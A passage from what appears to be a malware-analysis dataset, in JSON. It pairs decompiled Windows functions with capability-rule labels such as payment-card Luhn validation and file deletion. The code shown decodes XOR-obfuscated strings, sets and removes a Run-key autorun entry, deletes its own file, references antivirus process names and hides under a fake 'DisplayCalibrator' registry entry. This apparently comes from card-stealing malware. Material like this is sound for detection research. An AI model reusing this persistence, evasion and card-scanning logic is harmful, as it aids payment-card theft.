var_24h;\n    uint16_t var_22h;\n    uint16_t var_20h;\n    uint16_t var_1eh;\n    ushort var_1ch;\n    uint var_1ah;\n    uint var_16h;\n    uint var_12h;\n    uint var_eh;\n    int16_t var_ah;\n    int16_t var_8h;\n    ushort var_6h;\n    uint hKey;\n    \n    var_97h = *0x424950;\n    uStack151 = *0x424954;\n    uStack147 = *0x424958;\n    uStack143 = *0x42495c;\n    var_68h = 1;\n    uVar4 = 0;\n    var_87h = *0x424970;\n    uStack135 = *0x424974;\n    uStack131 = *0x424978;\n    uStack127 = *0x42497c;\n    var_77h = 0x6d4f555e;\n    var_73h = 0x5248495e;\n    var_6fh = 0x69675554;\n    var_6bh = 0x554e;\n    do {\n        var_97h._0_1_ = *0x424950;\n        puVar1 = &var_97h + uVar4 + 1;\n        *puVar1 = *puVar1 ^ var_97h;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x2d);\n    var_69h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, &var_97h + 1, 0, 0, 0, 0x2001f, 0, &hKey, &var_9ch);\n    if (iVar2 != 0) {\n        return false;\n    }\n    var_48h = 0x56000e;\n    var_30h._0_2_ = *0x4232f2 ^ 0xe;\n    var_44h = 0x3f0041;\n    var_30h._2_2_ = str.Removed_autorun_key._0_2_ ^ 0xe;\n    var_40h = 0x4f0056;\n    var_2ch = str.Removed_autorun_key._2_2_ ^ 0xe;\n    var_3ch = 0x7e004a;\n    var_2ah = str.Removed_autorun_key._4_2_ ^ 0xe;\n    var_38h = 0x3e0041;\n    var_28h = str.Removed_autorun_key._6_2_ ^ 0xe;\n    var_34h = 0xe003f;\n    var_26h = str.Removed_autorun_key._8_2_ ^ 0xe;\n    var_24h = str.Removed_autorun_key._10_2_ ^ 0xe;\n    var_22h = str.Removed_autorun_key._12_2_ ^ 0xe;\n    var_20h = str.Removed_autorun_key._14_2_ ^ 0xe;\n    var_1eh = str.Removed_autorun_key._16_2_ ^ 0xe;\n    uVar4 = 0;\n    do {\n        *(&var_48h + uVar4 * 2 + 2) = *(&var_48h + uVar4 * 2 + 2) ^ 0xe;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x15);\n    var_1ch = 0;\n    if (param_1 == 0) {\n        var_64h = 0x104;\n        var_1ah = 0x220074;\n        var_16h = 0x730025;\n        var_12h = 0x22;\n        var_eh._0_2_ = *0x423312;\n        var_eh._2_2_ = *0x423314;\n        var_ah = *0x423316;\n        var_8h = *0x423318;\n        var_6h = 0;\n        iVar2 = (*_sym.imp.USER32.dll_wsprintfW)(&lpString2, &var_1ah + 2, *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 0x3c));\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &var_48h + 2, 0, &var_68h, &lpString1, &var_64h);\n        if ((iVar3 != 0) || (iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, &lpString2),  iVar3 != 0)) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, &var_48h + 2, 0, 1, &lpString2, iVar2 * 2);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar3 == 0;\n    }\n    arglist = hKey;\n    (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &var_48h + 2);\n    uVar4 = 0;\n    var_5dh = *0x4243f0;\n    uStack93 = *0x4243f4;\n    uStack89 = *0x4243f8;\n    uStack85 = *0x4243fc;\n    var_4dh = 0x1408064d;\n    do {\n        var_5dh._0_1_ = *0x4243f0;\n        puVar1 = &var_5dh + uVar4 + 1;\n        *puVar1 = *puVar1 ^ var_5dh;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 0x13);\n    var_49h = 0;\n    fcn.0040a0b0(&var_5dh + 1, arglist);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return true;\n}\n",
        "token_count": 1737
    },
    "0041a750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file/1476a0a7391548a685f053c74cc3e8cf"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041a750(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint pExecInfo;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    int32_t var_1e4h;\n    uint *var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint16_t var_e8h;\n    uint16_t var_e6h;\n    uint16_t var_e4h;\n    uint16_t var_e2h;\n    uint16_t var_e0h;\n    uint16_t var_deh;\n    uint16_t var_dch;\n    uint16_t var_dah;\n    uint16_t var_d8h;\n    uint16_t var_d6h;\n    uint16_t var_d4h;\n    uint16_t var_d2h;\n    uint16_t var_d0h;\n    uint16_t var_ceh;\n    uint16_t var_cch;\n    uint16_t var_cah;\n    uint16_t var_c8h;\n    uint16_t var_c6h;\n    uint16_t var_c4h;\n    uint16_t var_c2h;\n    uint16_t var_c0h;\n    uint16_t var_beh;\n    uint16_t var_bch;\n    uint16_t var_bah;\n    uint16_t var_b8h;\n    uint16_t var_b6h;\n    uint16_t var_b4h;\n    uint16_t var_b2h;\n    uint16_t var_b0h;\n    uint16_t var_aeh;\n    uint16_t var_ach;\n    uint16_t var_aah;\n    uint16_t var_a8h;\n    uint16_t var_a6h;\n    uint16_t var_a4h;\n    uint16_t var_a2h;\n    uint16_t var_a0h;\n    uint16_t var_9eh;\n    uint16_t var_9ch;\n    uint16_t var_9ah;\n    uint16_t var_98h;\n    uint16_t var_96h;\n    uint16_t var_94h;\n    uint16_t var_92h;\n    uint16_t var_90h;\n    uint16_t var_8eh;\n    uint16_t var_8ch;\n    uint16_t var_8ah;\n    uint16_t var_88h;\n    uint16_t var_86h;\n    uint16_t var_84h;\n    uint16_t var_82h;\n    uint16_t var_80h;\n    uint16_t var_7eh;\n    uint16_t var_7ch;\n    uint16_t var_7ah;\n    uint16_t var_78h;\n    uint16_t var_76h;\n    uint16_t var_74h;\n    uint16_t var_72h;\n    uint16_t var_70h;\n    uint16_t var_6eh;\n    uint16_t var_6ch;\n    uint16_t var_6ah;\n    uint16_t var_68h;\n    uint16_t var_66h;\n    uint16_t var_64h;\n    uint16_t var_62h;\n    uint16_t var_60h;\n    uint16_t var_5eh;\n    uint16_t var_5ch;\n    uint16_t var_5ah;\n    uint16_t var_58h;\n    uint16_t var_56h;\n    uint16_t var_54h;\n    uint16_t var_52h;\n    uint16_t var_50h;\n    uint16_t var_4eh;\n    uint16_t var_4ch;\n    uint16_t var_4ah;\n    uint16_t var_48h;\n    uint16_t var_46h;\n    uint16_t var_44h;\n    uint16_t var_42h;\n    uint16_t var_40h;\n    uint16_t var_3eh;\n    uint16_t var_3ch;\n    uint16_t var_3ah;\n    uint16_t var_38h;\n    uint16_t var_36h;\n    uint16_t var_34h;\n    uint16_t var_32h;\n    uint16_t var_30h;\n    uint16_t var_2eh;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint16_t var_28h;\n    uint16_t var_26h;\n    ushort var_24h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint var_10h;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x30);\n    var_1b8h = 0x730053;\n    var_ech._0_2_ = *0x42329a ^ 0x53;\n    var_1b4h = 0x10007c;\n    var_ech._2_2_ = *0x42329c ^ 0x53;\n    var_1b0h = 0x230073;\n    var_e8h = *0x42329e ^ 0x53;\n    var_1ach = 0x3d003a;\n    var_e6h = *0x4232a0 ^ 0x53;\n    var_1a8h = 0x730034;\n    var_e4h = *0x4232a2 ^ 0x53;\n    var_1a4h = 0x610062;\n    var_e2h = *0x4232a4 ^ 0x53;\n    var_1a0h = 0x7d0064;\n    var_e0h = *0x4232a6 ^ 0x53;\n    var_19ch = 0x7d0063;\n    var_deh = *0x4232a8 ^ 0x53;\n    var_198h = 0x7d0063;\n    var_194h = 0x730064;\n    var_190h = 0x3d007e;\n    var_18ch = 0x600073;\n    var_188h = 0x6d0073;\n    var_184h = 0x1d0073;\n    var_180h = 0x3f0026;\n    var_17ch = 0x750073;\n    var_178h = 0x350073;\n    var_174h = 0x260020;\n    var_170h = 0x3a0027;\n    var_16ch = 0x73003f;\n    var_168h = 0x3a0035;\n    var_164h = 0x36003f;\n    var_160h = 0x200073;\n    var_15ch = 0x270036;\n    var_158h = 0x360009;\n    var_154h = 0x3c0021;\n    var_150h = 0x320017;\n    var_14ch = 0x320027;\n    var_148h = 0x3c0073;\n    var_144h = 0x350035;\n    var_140h = 0x360020;\n    var_13ch = 0x6e0027;\n    var_138h = 0x730063;\n    var_134h = 0x36003f;\n    var_130h = 0x34003d;\n    var_12ch = 0x3b0027;\n    var_128h = 0x66006e;\n    var_124h = 0x670061;\n    var_120h = 0x6b0061;\n    var_11ch = 0x73006b;\n    var_118h = 0x760071;\n    var_114h = 0x710020;\n    var_110h = 0x750073;\n    var_10ch = 0x170073;\n    var_108h = 0x3f0036;\n    var_104h = 0x7c0073;\n    var_100h = 0x730035;\n    var_fch = 0x22007c;\n    var_f8h = 0x710073;\n    var_f4h = 0x200076;\n    var_f0h = 0x530071;\n    var_dch = *0x4232aa ^ 0x53;\n    var_dah = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._0_2_ ^ 0x53;\n    var_d8h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._2_2_ ^ 0x53;\n    var_d6h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._4_2_ ^ 0x53;\n    var_d4h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._6_2_ ^ 0x53;\n    var_d2h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._8_2_ ^ 0x53;\n    var_d0h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._10_2_ ^ 0x53;\n    var_ceh = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._12_2_ ^ 0x53;\n    var_cch = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._14_2_ ^ 0x53;\n    var_cah = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._16_2_ ^ 0x53;\n    var_c8h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._18_2_ ^ 0x53;\n    var_c6h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._20_2_ ^ 0x53;\n    var_c4h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._22_2_ ^ 0x53;\n    var_c2h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._24_2_ ^ 0x53;\n    var_c0h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._26_2_ ^ 0x53;\n    var_beh = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._28_2_ ^ 0x53;\n    var_bch = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._30_2_ ^ 0x53;\n    var_bah = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._32_2_ ^ 0x53;\n    var_b8h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._34_2_ ^ 0x53;\n    var_b6h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._36_2_ ^ 0x53;\n    var_b4h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._38_2_ ^ 0x53;\n    var_b2h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._40_2_ ^ 0x53;\n    var_b0h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._42_2_ ^ 0x53;\n    var_aeh = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._44_2_ ^ 0x53;\n    var_ach = *0x4232da ^ 0x53;\n    var_aah = str.XO1XADpO01[0] ^ 0x53;\n    var_a8h = str.XO1XADpO01[1] ^ 0x53;\n    var_a6h = str.XO1XADpO01[2] ^ 0x53;\n    var_a4h = str.XO1XADpO01[3] ^ 0x53;\n    var_a2h = str.XO1XADpO01[4] ^ 0x53;\n    var_a0h = str.XO1XADpO01[5] ^ 0x53;\n    var_9eh = str.XO1XADpO01[6] ^ 0x53;\n    var_9ch = str.XO1XADpO01[7] ^ 0x53;\n    var_9ah = str.XO1XADpO01[8] ^ 0x53;\n    var_98h = str.XO1XADpO01[9] ^ 0x53;\n    var_96h = str.XO1XADpO01[10] ^ 0x53;\n    var_94h = *0x4232f2 ^ 0x53;\n    var_92h = str.Removed_autorun_key._0_2_ ^ 0x53;\n    var_90h = str.Removed_autorun_key._2_2_ ^ 0x53;\n    var_8eh = str.Removed_autorun_key._4_2_ ^ 0x53;\n    var_8ch = str.Removed_autorun_key._6_2_ ^ 0x53;\n    var_8ah = str.Removed_autorun_key._8_2_ ^ 0x53;\n    var_88h = str.Removed_autorun_key._10_2_ ^ 0x53;\n    var_86h = str.Removed_autorun_key._12_2_ ^ 0x53;\n    var_84h = str.Removed_autorun_key._14_2_ ^ 0x53;\n    var_82h = str.Removed_autorun_key._16_2_ ^ 0x53;\n    var_80h = str.Removed_autorun_key._18_2_ ^ 0x53;\n    var_7eh = str.__s_[0] ^ 0x53;\n    var_7ch = str.__s_[1] ^ 0x53;\n    var_7ah = str.__s_[2] ^ 0x53;\n    var_78h = str.__s_[3] ^ 0x53;\n    var_76h = str.__s_[4] ^ 0x53;\n    var_74h = *0x423312 ^ 0x53;\n    var_72h = *0x423314 ^ 0x53;\n    var_70h = *0x423316 ^ 0x53;\n    var_6eh = *0x423318 ^ 0x53;\n    var_6ch = *0x42331a ^ 0x53;\n    var_6ah = *0x42331c ^ 0x53;\n    var_68h = *0x42331e ^ 0x53;\n    var_66h = *0x423320 ^ 0x53;\n    var_64h = *0x423322 ^ 0x53;\n    var_62h = *0x423324 ^ 0x53;\n    var_60h = *0x423326 ^ 0x53;\n    var_5eh = str.wrapper._0_2_ ^ 0x53;\n    var_5ch = str.wrapper._2_2_ ^ 0x53;\n    var_5ah = str.wrapper._4_2_ ^ 0x53;\n    var_58h = str.wrapper._6_2_ ^ 0x53;\n    var_56h = str.DefWatch._0_2_ ^ 0x53;\n    var_54h = str.DefWatch._2_2_ ^ 0x53;\n    var_52h = str.DefWatch._4_2_ ^ 0x53;\n    var_50h = str.DefWatch._6_2_ ^ 0x53;\n    var_4eh = *0x423338 ^ 0x53;\n    var_4ch = *0x42333a ^ 0x53;\n    var_4ah = str.ccEvtMgr._0_2_ ^ 0x53;\n    var_48h = str.ccEvtMgr._2_2_ ^ 0x53;\n    var_46h = str.ccEvtMgr._4_2_ ^ 0x53;\n    var_44h = str.ccEvtMgr._6_2_ ^ 0x53;\n    var_42h = *0x423344 ^ 0x53;\n    var_40h = *0x423346 ^ 0x53;\n    var_3eh = str.ccSetMgr._0_2_ ^ 0x53;\n    var_3ch = str.ccSetMgr._2_2_ ^ 0x53;\n    var_3ah = str.ccSetMgr._4_2_ ^ 0x53;\n    var_38h = str.ccSetMgr._6_2_ ^ 0x53;\n    var_36h = *0x423350 ^ 0x53;\n    var_34h = *0x423352 ^ 0x53;\n    var_32h = str.SavRoam._0_2_ ^ 0x53;\n    var_30h = str.SavRoam._2_2_ ^ 0x53;\n    var_2eh = str.SavRoam._4_2_ ^ 0x53;\n    var_2ch = str.SavRoam._6_2_ ^ 0x53;\n    var_2ah = str.Sqlservr._0_2_ ^ 0x53;\n    var_28h = str.Sqlservr._2_2_ ^ 0x53;\n    var_26h = str.Sqlservr._4_2_ ^ 0x53;\n    uVar3 = 0;\n    do {\n        *(&var_1b8h + uVar3 * 2 + 2) = *(&var_1b8h + uVar3 * 2 + 2) ^ 0x53;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0xc9);\n    var_24h = 0;\n    uVar2 = *(*(iVar1 + 0x10) + 0x3c);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &var_1b8h + 2, uVar2, uVar2);\n    (*_sym.imp.KERNEL32.dll_MoveFileExW)(*(*(iVar1 + 0x10) + 0x3c), 0, 4);\n    pExecInfo = 0x3c;\n    var_10h._0_2_ = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._0_2_ ^ 0x66;\n    var_1f0h = 0x400;\n    var_10h._2_2_ = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._2_2_ ^ 0x66;\n    var_1ech = 0;\n    var_ch = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._4_2_ ^ 0x66;\n    var_1e8h = 0;\n    var_ah = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._6_2_ ^ 0x66;\n    var_22h = 0x50066;\n    var_8h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._8_2_ ^ 0x66;\n    var_1eh = 0x2000b;\n    var_6h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._10_2_ ^ 0x66;\n    var_1ah = 0x30048;\n    var_4h = str.SOFTWAREMicrosoftWindowsCurrentVersionRun._12_2_ ^ 0x66;\n    uVar3 = 0;\n    var_16h = 0x3001e;\n    var_12h = 0x66;\n    var_2h = 0;\n    do {\n        *(&var_22h + uVar3 * 2 + 2) = *(&var_22h + uVar3 * 2 + 2) ^ 0x66;\n        uVar3 = uVar3 + 1;\n    } while (uVar3 < 0xf);\n    var_1e4h = &var_22h + 2;\n    var_1dch = 0;\n    var_1e0h = &ARG_0;\n    var_1d8h = 0;\n    var_1d4h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 4936
    },
    "0041de40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0041de40(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uStack62;\n    uint uStack58;\n    int16_t iStack54;\n    uint32_t uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    ushort uStack32;\n    \n    pcVar2 = _sym.imp.ntdll.dll_RtlInterlockedPopEntrySList;\n    LOCK();\n    *0x429344 = *0x429344 + 1;\n    pcVar1 = _sym.imp.ntdll.dll_RtlLeaveCriticalSection;\n    do {\n        (*_sym.imp.ntdll.dll_RtlEnterCriticalSection)(0x4292e0);\n        do {\n            if (*0x429348 < 1) {\n                (*pcVar1)(0x4292e0);\n                LOCK();\n                *0x429344 = *0x429344 + -1;\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            *0x429348 = *0x429348 + -1;\n            iVar4 = (*pcVar2)(*0x428f14);\n        } while (iVar4 == 0);\n        uStack52 = *(iVar4 + 4);\n        uStack48 = *(iVar4 + 8);\n        uStack44 = *(iVar4 + 0xc);\n        uStack40 = *(iVar4 + 0x10);\n        uStack36 = *(iVar4 + 0x14);\n        uStack32 = *(iVar4 + 0x18);\n        (*_sym.imp.msvcrt.dll_free)(iVar4);\n        (*pcVar1)(0x4292e0);\n        cVar3 = fcn.0041e5e0();\n        if (((cVar3 != '\\0') || (cVar3 = fcn.0041e5e0(),  cVar3 != '\\0')) &&\n           (iVar4 = (*_sym.imp.msvcrt.dll_malloc)(0x3c),  pcVar1 = _sym.imp.ntdll.dll_RtlLeaveCriticalSection, \n           iVar4 != 0)) {\n            uStack62 = 0x250020;\n            uStack58 = 0x53;\n            iStack54 = *0x42417a;\n            uStack52 = str.14:08:33._0_2_;\n            (*_sym.imp.USER32.dll_wsprintfW)(iVar4, &uStack62 + 2, &uStack48);\n            fcn.0041dfb0();\n            pcVar1 = _sym.imp.ntdll.dll_RtlLeaveCriticalSection;\n        }\n    } while( true );\n}\n",
        "token_count": 614
    },
    "0041eca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0041eca0(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_14ah;\n    uint var_146h;\n    uint var_142h;\n    uint var_13eh;\n    uint var_13ah;\n    uint var_136h;\n    uint var_132h;\n    uint var_12eh;\n    uint var_12ah;\n    ushort var_126h;\n    uint var_124h;\n    uint16_t var_120h;\n    uint16_t var_11eh;\n    uint16_t var_11ch;\n    uint16_t var_11ah;\n    uint16_t var_118h;\n    uint16_t var_116h;\n    uint16_t var_114h;\n    uint16_t var_112h;\n    uint16_t var_110h;\n    uint16_t var_10eh;\n    uint16_t var_10ch;\n    uint16_t var_10ah;\n    uint16_t var_108h;\n    uint16_t var_106h;\n    uint16_t var_104h;\n    ushort var_102h;\n    int32_t *var_100h;\n    uint var_fah;\n    uint var_f6h;\n    uint var_f2h;\n    uint var_eeh;\n    uint var_eah;\n    uint var_e6h;\n    uint var_e2h;\n    uint var_deh;\n    uint var_dah;\n    uint var_d6h;\n    uint var_d2h;\n    uint var_ceh;\n    uint var_cah;\n    uint var_c6h;\n    uint var_c2h;\n    uint var_beh;\n    uint var_bah;\n    uint var_b6h;\n    uint var_b2h;\n    uint var_aeh;\n    uint var_aah;\n    uint var_a6h;\n    uint var_a2h;\n    uint var_9eh;\n    uint var_9ah;\n    uint var_96h;\n    uint var_92h;\n    uint var_8eh;\n    uint var_8ah;\n    uint var_86h;\n    uint var_82h;\n    uint32_t var_7eh;\n    uint32_t var_7ah;\n    uint32_t var_76h;\n    uint32_t var_72h;\n    uint32_t var_6eh;\n    uint32_t var_6ah;\n    uint32_t var_66h;\n    uint32_t var_62h;\n    uint32_t var_5eh;\n    uint32_t var_5ah;\n    uint32_t var_56h;\n    uint var_52h;\n    uint16_t var_4eh;\n    uint16_t var_4ch;\n    uint16_t var_4ah;\n    uint16_t var_48h;\n    uint16_t var_46h;\n    uint16_t var_44h;\n    uint16_t var_42h;\n    uint16_t var_40h;\n    uint16_t var_3eh;\n    uint16_t var_3ch;\n    uint16_t var_3ah;\n    uint16_t var_38h;\n    uint16_t var_36h;\n    uint16_t var_34h;\n    uint16_t var_32h;\n    uint16_t var_30h;\n    uint16_t var_2eh;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint16_t var_28h;\n    uint16_t var_26h;\n    uint16_t var_24h;\n    uint16_t var_22h;\n    uint16_t var_20h;\n    uint16_t var_1eh;\n    uint16_t var_1ch;\n    uint16_t var_1ah;\n    uint16_t var_18h;\n    uint16_t var_16h;\n    uint16_t var_14h;\n    uint16_t var_12h;\n    uint16_t var_10h;\n    uint16_t var_eh;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    ushort var_6h;\n    int32_t *var_4h;\n    \n    var_100h = NULL;\n    var_4h = NULL;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 2);\n    var_a2h = 0x2e0055;\n    var_9eh = 0x100066;\n    var_52h._0_2_ = *0x424266 ^ 0x55;\n    var_9ah = 0x130060;\n    var_52h._2_2_ = str.DisplayCalibrator[0] ^ 0x55;\n    var_96h = 0x620016;\n    var_4eh = str.DisplayCalibrator[1] ^ 0x55;\n    var_92h = 0x6c0013;\n    var_4ch = str.DisplayCalibrator[2] ^ 0x55;\n    var_8eh = 0x6c0078;\n    var_4ah = str.DisplayCalibrator[3] ^ 0x55;\n    var_8ah = 0x600014;\n    var_48h = str.DisplayCalibrator[4] ^ 0x55;\n    var_86h = 0x780064;\n    var_46h = str.DisplayCalibrator[5] ^ 0x55;\n    var_82h = 0x660061;\n    var_44h = str.DisplayCalibrator[6] ^ 0x55;\n    var_7eh = 0x620063;\n    var_42h = str.DisplayCalibrator[7] ^ 0x55;\n    var_7ah = 0x6c0078;\n    var_40h = str.DisplayCalibrator[8] ^ 0x55;\n    var_76h = 0x630065;\n    var_3eh = str.DisplayCalibrator[9] ^ 0x55;\n    var_72h = 0x780066;\n    var_3ch = str.DisplayCalibrator[10] ^ 0x55;\n    var_6eh = 0x640014;\n    var_3ah = str.DisplayCalibrator[11] ^ 0x55;\n    var_6ah = 0x650067;\n    var_38h = str.DisplayCalibrator[12] ^ 0x55;\n    var_66h = 0x610067;\n    var_36h = str.DisplayCalibrator[13] ^ 0x55;\n    var_62h = 0x130061;\n    var_34h = str.DisplayCalibrator[14] ^ 0x55;\n    var_5eh = 0x100017;\n    var_5ah = 0x620016;\n    var_56h = 0x550028;\n    var_32h = str.DisplayCalibrator[15] ^ 0x55;\n    var_30h = str.DisplayCalibrator[16] ^ 0x55;\n    var_2eh = str.DisplayCalibrator[17] ^ 0x55;\n    var_2ch = *0x42428c ^ 0x55;\n    var_2ah = *0x42428e ^ 0x55;\n    var_28h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[0] ^ 0x55;\n    var_26h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[1] ^ 0x55;\n    var_24h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[2] ^ 0x55;\n    var_22h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[3] ^ 0x55;\n    var_20h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[4] ^ 0x55;\n    var_1eh = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[5] ^ 0x55;\n    var_1ch = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[6] ^ 0x55;\n    var_1ah = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[7] ^ 0x55;\n    var_18h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[8] ^ 0x55;\n    var_16h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[9] ^ 0x55;\n    var_14h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[10] ^ 0x55;\n    var_12h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[11] ^ 0x55;\n    var_10h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[12] ^ 0x55;\n    var_eh = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[13] ^ 0x55;\n    var_ch = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[14] ^ 0x55;\n    var_ah = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[15] ^ 0x55;\n    var_8h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[16] ^ 0x55;\n    uVar2 = 0;\n    do {\n        *(&var_a2h + uVar2 * 2 + 2) = *(&var_a2h + uVar2 * 2 + 2) ^ 0x55;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x4d);\n    var_6h = 0;\n    uVar2 = fcn.0041e7e0(4, &var_100h);\n    if (uVar2 == 0) {\n        if (var_100h == NULL) {\n            uVar2 = 0x8007000e;\n            goto code_r0x0041fa4e;\n        }\n        var_14ah = 0x770033;\n        var_146h = 0x40005a;\n        var_124h._0_2_ = *0x42428c ^ 0x33;\n        var_142h = 0x5f0043;\n        var_124h._2_2_ = *0x42428e ^ 0x33;\n        var_13eh = 0x4a0052;\n        var_120h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[0] ^ 0x33;\n        var_13ah = 0x520070;\n        var_11eh = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[1] ^ 0x33;\n        var_136h = 0x5a005f;\n        var_11ch = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[2] ^ 0x33;\n        var_132h = 0x410051;\n        var_11ah = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[3] ^ 0x33;\n        var_12eh = 0x470052;\n        var_118h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[4] ^ 0x33;\n        var_12ah = 0x41005c;\n        var_116h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[5] ^ 0x33;\n        var_126h = 0x33;\n        var_114h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[6] ^ 0x33;\n        var_112h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[7] ^ 0x33;\n        var_110h = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[8] ^ 0x33;\n        var_10eh = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[9] ^ 0x33;\n        var_10ch = str.SoftwareMicrosoftWindows_NTCurrentVersionICMCalibration[10] ^ 0x33;\n        var_10ah = 